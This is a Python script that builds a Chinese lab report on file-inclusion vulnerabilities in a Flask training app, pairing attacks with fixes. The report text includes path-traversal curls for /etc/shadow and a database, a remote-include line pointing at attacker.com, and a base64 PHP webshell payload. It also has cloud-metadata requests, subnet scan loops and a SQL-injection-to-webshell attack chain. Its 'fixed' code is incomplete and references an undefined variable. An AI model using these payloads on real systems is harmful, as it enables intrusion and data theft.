#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
文件包含漏洞分析与修复报告生成器
覆盖：路径穿越、HTTP伪协议、data伪协议、php伪协议
"""
import os
from docx import Document
from docx.shared import Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml

doc = Document()

style = doc.styles['Normal']
style.font.name = 'Microsoft YaHei'
style.font.size = Pt(11)
style.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')
for i in range(1,5):
    hs = doc.styles[f'Heading {i}']
    hs.font.name = 'Microsoft YaHei'
    hs.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

def code(doc, text, green=False):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after = Pt(3)
    fill = "E8F5E9" if green else "FFEBEE"
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(s)
    r = p.add_run(text)
    r.font.name = 'Courier New'
    r.font.size = Pt(9)
    return p

def box(doc, text, color="red"):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after = Pt(3)
    fill = "FFCDD2" if color=="red" else "C8E6C9"
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(s)
    r = p.add_run(text)
    r.bold = True; r.font.size = Pt(11)
    return p

def shade(c, color):
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color}" w:val="clear"/>')
    c._tc.get_or_add_tcPr().append(s)

def tbl(doc, data):
    t = doc.add_table(rows=len(data), cols=len(data[0]), style='Light Grid Accent 1')
    t.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, rd in enumerate(data):
        for j, ct in enumerate(rd):
            t.rows[i].cells[j].text = ct
            for p in t.rows[i].cells[j].paragraphs:
                p.alignment = WD_ALIGN_PARAGRAPH.CENTER
                for r in p.runs: r.font.size = Pt(10)
            if i==0:
                shade(t.rows[i].cells[j], "1A237E")
                for p in t.rows[i].cells[j].paragraphs:
                    for r in p.runs: r.font.color.rgb = RGBColor(0xFF,0xFF,0xFF)
    return t

# ===== 封面 =====
for _ in range(4): doc.add_paragraph("")
t = doc.add_paragraph(); t.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = t.add_run("文件包含漏洞分析与修复报告"); r.font.size = Pt(24); r.bold = True
r.font.color.rgb = RGBColor(0x1a,0x1a,0x2e)
doc.add_paragraph("")
s = doc.add_paragraph(); s.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = s.add_run("——路径穿越·伪协议利用·文件读取——"); r.font.size = Pt(14)
r.font.color.rgb = RGBColor(0x45,0x45,0x45)
for _ in range(3): doc.add_paragraph("")
i = doc.add_paragraph(); i.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = i.add_run("实验项目：Web安全漏洞分析与修复\n课程名称：网络安全实训\n报告日期：2026年7月")
r.font.size = Pt(12)
doc.add_page_break()

# ===== 目录 =====
doc.add_heading("目  录", level=1)
chapters = ["文件包含漏洞概述","路径穿越漏洞分析与复现","伪协议漏洞详解（HTTP/data/php）",
    "内网IP扫描与攻击链","漏洞复现步骤（Burp Suite实操）","修复方案详解",
    "修复前后代码对比","安全编码规范总结"]
for i,ch in enumerate(chapters,1):
    p = doc.add_paragraph(f"第{i}章  {ch}")
    p.paragraph_format.space_after = Pt(6); p.runs[0].font.size = Pt(12)
doc.add_page_break()

# ===== 第一章 =====
doc.add_heading("第一章  文件包含漏洞概述", level=1)
doc.add_paragraph("文件包含漏洞（File Inclusion Vulnerability）是Web应用中常见的安全漏洞。攻击者通过操控文件路径参数，可以读取服务器上的任意文件，甚至执行远程代码。")

doc.add_heading("1.1 漏洞危害", level=2)
tbl(doc, [("危害类型","说明"),("信息泄露","读取/etc/passwd、config.py等敏感文件"),
    ("路径遍历","使用../跳出限制目录"),("代码执行","配合日志文件或上传功能执行任意代码"),
    ("内网探测","利用HTTP伪协议扫描内网资产")])

doc.add_heading("1.2 本次实验漏洞点", level=2)
box(doc, "🔴 漏洞：/page?name=help 中 name 参数直接拼接到文件路径，未做任何过滤")
code(doc,
    '@app.route("/page", methods=["GET"])\n'
    'def page():\n'
    '    name = request.args.get("name", "")  # ⚠️ 用户可控\n'
    '    file_path = os.path.join("pages", name)  # ⚠️ 直接拼接，未过滤..\n'
    '    with open(file_path, "r") as f:\n'
    '        page_content = f.read()  # ⚠️ 任意文件读取')

# ===== 第二章 =====
doc.add_heading("第二章  路径穿越漏洞分析与复现", level=1)
doc.add_heading("2.1 漏洞原理", level=2)
doc.add_paragraph("路径穿越（Path Traversal）利用 ../ 符号跳出限制目录，读取系统任意文件。Flask中os.path.join不会阻止../，攻击者可构造特殊路径。")

doc.add_heading("2.2 攻击payload", level=2)
tbl(doc, [("payload","效果"),
    ("/page?name=help","正常访问帮助页面"),
    ("/page?name=../app.py","读取Flask应用源码（信息泄露）"),
    ("/page?name=../data/users.db","下载SQLite数据库文件"),
    ("/page?name=../../etc/passwd","读取Linux密码文件（仅Linux）"),
    ("/page?name=../../etc/shadow","读取用户密码哈希"),
    ("/page?name=../static/uploads/shell.php","访问上传的WebShell")])

doc.add_paragraph("")
doc.add_paragraph("使用 curl 命令验证：")
code(doc,
    "# 读取应用源码\n"
    "curl 'http://target:5000/page?name=../app.py'\n\n"
    "# 读取数据库文件\n"
    "curl 'http://target:5000/page?name=../data/users.db'\n\n"
    "# 下载数据库\n"
    "curl -o leaked_users.db 'http://target:5000/page?name=../data/users.db'")

doc.add_heading("2.3 多层穿越", level=2)
doc.add_paragraph("根据服务器目录深度，可能需要多层 ../：")
code(doc,
    "# 读取 /etc/passwd（Linux默认安装目录结构）\n"
    "curl 'http://target:5000/page?name=../../../../../../etc/passwd'\n\n"
    "# 读取 /etc/shadow\n"
    "curl 'http://target:5000/page?name=../../../../../../etc/shadow'")

# ===== 第三章 =====
doc.add_heading("第三章  伪协议漏洞详解", level=1)
doc.add_paragraph("伪协议（Pseudo Protocol）是在文件包含函数中使用的特殊协议，用于执行特定操作。虽然在Python/Flask中不如PHP常见，但理解其原理对安全分析至关重要。")

doc.add_heading("3.1 HTTP伪协议", level=2)
doc.add_paragraph("HTTP伪协议允许文件包含函数从远程服务器获取内容，用于远程文件包含(RFI)和内网扫描。")
tbl(doc, [("PHP代码","效果"),
    ("include('http://attacker.com/shell.txt')","远程执行恶意代码"),
    ("include('http://192.168.1.1/admin.php')","探测内网Web服务"),
    ("file_get_contents('http://169.254.169.254/latest/meta-data/')","读取AWS元数据（云服务器）")])

doc.add_paragraph("")
doc.add_paragraph("内网探测利用：")
code(doc,
    "# 扫描内网主机（通过HTTP响应时间/状态码判断存活）\n"
    "import requests\n"
    "for i in range(1,255):\n"
    "    url = f'http://192.168.1.{i}:80'\n"
    "    try:\n"
    "        r = requests.get(url, timeout=1)\n"
    "        if r.status_code == 200:\n"
    "            print(f'存活: {i}')\n"
    "    except:\n"
    "        pass")

doc.add_heading("3.2 data伪协议", level=2)
doc.add_paragraph("data伪协议允许直接在URL中嵌入数据内容，实现代码执行：")
tbl(doc, [("PHP代码","效果"),
    ("include('data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==')","base64编码的PHP代码执行"),
    ("file_get_contents('data://text/plain,hello')","读取纯文本数据")])

doc.add_heading("3.3 php伪协议（php://）", level=2)
doc.add_paragraph("php://协议允许访问各种I/O流，常用于读取源码和执行代码：")
tbl(doc, [("PHP代码","效果"),
    ("include('php://filter/read=convert.base64-encode/resource=config.php')","Base64读取源码（绕过过滤）"),
    ("include('php://input')","POST方式发送PHP代码执行"),
    ("php://filter/read=convert.base64-encode/resource=/etc/passwd","读取系统文件")])

doc.add_paragraph("")
doc.add_paragraph("php://filter 读取源码示例：")
code(doc,
    "# PHP中利用php://filter读取源码\n"
    "index.php?page=php://filter/read=convert.base64-encode/resource=config.php\n\n"
    "# 返回config.php的Base64编码内容，解码后即可看到源码\n"
    "# Base64解码：echo '编码内容' | base64 -d")

doc.add_heading("3.4 读取内网IP地址", level=2)
doc.add_paragraph("在云环境或内网环境中，可以利用伪协议读取内网元数据：")
code(doc,
    "# AWS云环境 - 读取内网IP和元数据\n"
    "curl http://169.254.169.254/latest/meta-data/local-ipv4\n"
    "curl http://169.254.169.254/latest/meta-data/public-ipv4\n"
    "curl http://169.254.169.254/latest/meta-data/\n\n"
    "# 阿里云环境\n"
    "curl http://100.100.100.200/latest/meta-data/\n\n"
    "# 本机内网IP\n"
    "ip addr show eth0 | grep 'inet '")

# ===== 第四章 =====
doc.add_heading("第四章  漏洞复现步骤（Burp Suite实操）", level=1)

doc.add_heading("4.1 准备工作", level=2)
doc.add_paragraph("1. 启动有漏洞的Flask应用")
doc.add_paragraph("2. 打开Burp Suite，配置浏览器代理127.0.0.1:8080")
doc.add_paragraph("3. 打开Intercept拦截开关")

doc.add_heading("4.2 路径穿越读取源码", level=2)
doc.add_paragraph("正常访问：")
code(doc, "GET /page?name=help\n→ 显示帮助页面内容")
doc.add_paragraph("")
doc.add_paragraph("路径穿越：")
code(doc,
    "GET /page?name=../app.py\n"
    "→ 返回Flask应用源码（信息泄露！）\n\n"
    "GET /page?name=../../../../../../etc/passwd\n"
    "→ 返回系统账户信息（服务器配置）")

doc.add_heading("4.3 内网IP扫描（Burp Intruder）", level=2)
doc.add_paragraph("使用Burp Intruder进行内网端口扫描：")
doc.add_paragraph("1. 拦截请求后发送到 Intruder（Ctrl+I）", style='List Bullet')
doc.add_paragraph("2. 设置payload位置为 name 参数", style='List Bullet')
doc.add_paragraph("3. 添加payload列表：常见内网IP段", style='List Bullet')
doc.add_paragraph("4. 根据响应时间/状态码判断端口是否开放", style='List Bullet')

doc.add_paragraph("")
doc.add_paragraph("curl批量扫描：")
code(doc,
    "for ip in 192.168.1.{1..254}; do\n"
    "  curl -s --connect-timeout 1 \"http://$ip:80/\" > /dev/null && echo \"存活: $ip\"\n"
    "done")

doc.add_heading("4.4 完整攻击链", level=2)
doc.add_paragraph("路径穿越 + SQL注入 + 文件上传联动攻击：")
code(doc,
    "# Step 1: SQL注入获取管理员密码\n"
    "POST /login\n"
    "username=admin' OR '1'='1' --&password=\n\n"
    "# Step 2: 路径穿越读取数据库文件\n"
    "GET /page?name=../data/users.db\n\n"
    "# Step 3: 上传WebShell\n"
    "POST /upload (shell.php)\n\n"
    "# Step 4: 执行系统命令\n"
    "POST /static/uploads/shell.php\n"
    "cmd=system('id');")

# ===== 第五章 =====
doc.add_heading("第五章  修复方案详解", level=1)

doc.add_heading("5.1 过滤路径穿越字符", level=2)
box(doc, "✅ 修复：过滤 ../ 和 / 等路径穿越字符", "green")
code(doc,
    '@app.route("/page", methods=["GET"])\n'
    'def page():\n'
    '    name = request.args.get("name", "")\n'
    '    # ✅ 过滤路径穿越字符\n'
    '    if "../" in name or ".." in name:\n'
    '        return "页面不存在"\n'
    '    if "/" in name or "\\\\" in name:\n'
    '        return "页面不存在"', green=True)

doc.add_heading("5.2 白名单机制", level=2)
box(doc, "✅ 修复：只允许读取指定的页面文件", "green")
code(doc,
    'ALLOWED_PAGES = {"help", "about", "contact", "faq"}\n\n'
    'if name not in ALLOWED_PAGES:\n'
    '    return "页面不存在"', green=True)

doc.add_heading("5.3 使用abspath规范化路径", level=2)
box(doc, "✅ 修复：将路径解析为绝对路径后验证是否在允许目录内", "green")
code(doc,
    'import os.path\n\n'
    'base_dir = os.path.abspath("pages")\n'
    'requested_path = os.path.abspath(os.path.join("pages", name))\n\n'
    '# ✅ 验证路径是否在pages目录内\n'
    'if not requested_path.startswith(base_dir):\n'
    '    return "页面不存在"', green=True)

doc.add_heading("5.4 输入白名单", level=2)

# ===== 第六章 =====
doc.add_heading("第六章  修复前后代码对比", level=1)
tbl(doc, [("对比项","有漏洞(app.py)","已修复(app_fixed.py)"),
    ("路径过滤","❌ 无过滤","✅ 过滤..和/字符"),
    ("白名单","❌ 无限制","✅ 白名单{help,about,faq}"),
    ("路径验证","❌ 无验证","✅ os.path.abspath校验"),
    ("../穿越","❌ 允许穿越","✅ 拒绝穿越请求"),
    ("任意文件读","❌ 可读任意文件","✅ 仅限pages目录")])

doc.add_heading("修复代码（app_fixed.py）", level=2)
code(doc,
    '# ✅ 安全的页面加载\n'
    'ALLOWED_PAGES = {"help", "about", "faq"}\n\n'
    '@app.route("/page_fixed", methods=["GET"])\n'
    'def page_fixed():\n'
    '    name = request.args.get("name", "")\n\n'
    '    # ✅ 白名单检查\n'
    '    if name not in ALLOWED_PAGES:\n'
    '        return "页面不存在"\n\n'
    '    # ✅ 路径校验\n'
    '    base = os.path.abspath("pages")\n'
    '    req = os.path.abspath(os.path.join("pages", name))\n'
    '    if not req.startswith(base):\n'
    '        return "页面不存在"\n\n'
    '    return render_template("page_fixed.html", page_content=content, page_name=name)', green=True)

# ===== 第七章 =====
doc.add_heading("第七章  安全编码规范总结", level=1)
principles = [
    ("原则一：永远不要信任用户输入","用户提交的路径、文件名等必须经过严格校验，不能直接拼接到文件路径中。"),
    ("原则二：使用白名单","文件包含的参数应使用白名单机制，明确允许哪些文件可被读取。"),
    ("原则三：路径规范化校验","使用os.path.abspath()将用户路径解析为绝对路径后，验证是否在允许的基目录内。"),
    ("原则四：最小权限原则","Web进程不应以root权限运行，避免读取/etc/shadow等敏感文件。"),
    ("原则五：禁用危险功能","生产环境中应禁用文件包含、eval等危险功能，或实施严格的白名单控制。"),
    ("原则六：纵深防御","路径校验+白名单+文件权限控制+WAF规则，多层防护。")]
for t,d in principles:
    doc.add_heading(t, level=2)
    doc.add_paragraph(d)

doc.add_paragraph("")
p = doc.add_paragraph(); p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("—— 报告结束 ——"); r.font.color.rgb = RGBColor(0x99,0x99,0x99); r.font.size = Pt(12)

out = "/root/flask-app-vuln/static/文件包含漏洞分析与修复报告.docx"
doc.save(out)
print(f"✅ Word报告已生成：{out}")
print(f"   文件大小：{os.path.getsize(out)/1024:.1f}KB")
